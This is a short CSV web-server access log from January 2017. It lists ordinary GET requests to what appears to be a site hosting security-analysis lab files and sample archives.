Log Format,Field 1,Field 2,Field 3,Field 4,Field 5,Field 6,Field 7
WSC,207.46.13.95,-,01/Jan/2017:05:59:46 -0800,GET / HTTP/1.1,301,483
WSC,207.46.13.95,-,01/Jan/2017:06:03:05 -0800,GET / HTTP/1.1,200,10267
WSC,162.217.31.85,-,01/Jan/2017:06:32:32 -0800,GET / HTTP/1.1,200,10230
WSC,162.217.31.85,-,01/Jan/2017:06:32:32 -0800,GET /apple-touch-icon-precomposed.png HTTP/1.1,404,303
WSC,162.217.31.85,-,01/Jan/2017:06:32:33 -0800,GET /apple-touch-icon.png HTTP/1.1,404,303
WSC,162.217.31.85,-,01/Jan/2017:06:32:34 -0800,GET /apple-touch-icon-precomposed.png HTTP/1.1,404,303
WSC,162.217.31.85,-,01/Jan/2017:06:32:34 -0800,GET /apple-touch-icon.png HTTP/1.1,404,303
WSC,94.252.88.177,-,01/Jan/2017:06:45:47 -0800,GET / HTTP/1.1,200,10267
WSC,94.252.88.177,-,01/Jan/2017:06:45:47 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,94.252.88.177,-,01/Jan/2017:06:45:47 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,94.252.88.177,-,01/Jan/2017:06:46:23 -0800,GET /pe_static/zeus.zip HTTP/1.1,200,51367111
WSC,47.189.17.206,-,01/Jan/2017:06:56:16 -0800,GET / HTTP/1.1,301,483
WSC,47.189.17.206,-,01/Jan/2017:06:56:17 -0800,GET / HTTP/1.1,200,10267
WSC,47.189.17.206,-,01/Jan/2017:06:56:17 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,47.189.17.206,-,01/Jan/2017:06:56:17 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,94.252.88.177,-,01/Jan/2017:07:09:11 -0800,GET / HTTP/1.1,200,10267
WSC,94.252.88.177,-,01/Jan/2017:07:09:12 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,94.252.88.177,-,01/Jan/2017:07:09:12 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,94.252.88.177,-,01/Jan/2017:07:09:23 -0800,GET /pe_static/ap1.zip HTTP/1.1,404,340
WSC,94.252.88.177,-,01/Jan/2017:07:09:42 -0800,GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1,200,4502388
WSC,71.10.36.99,-,01/Jan/2017:07:11:01 -0800,GET / HTTP/1.1,301,483
WSC,71.10.36.99,-,01/Jan/2017:07:11:01 -0800,GET / HTTP/1.1,200,10267
WSC,71.10.36.99,-,01/Jan/2017:07:11:01 -0800,GET /twitter-icon.png HTTP/1.1,200,27787
WSC,71.10.36.99,-,01/Jan/2017:07:11:01 -0800,GET /GitHub-Mark.png HTTP/1.1,200,7428
WSC,71.10.36.99,-,01/Jan/2017:07:11:02 -0800,GET /bootstrap/img/favicon.ico HTTP/1.1,200,589
WSC,66.249.66.105,-,01/Jan/2017:07:27:30 -0800,GET / HTTP/1.1,200,10267
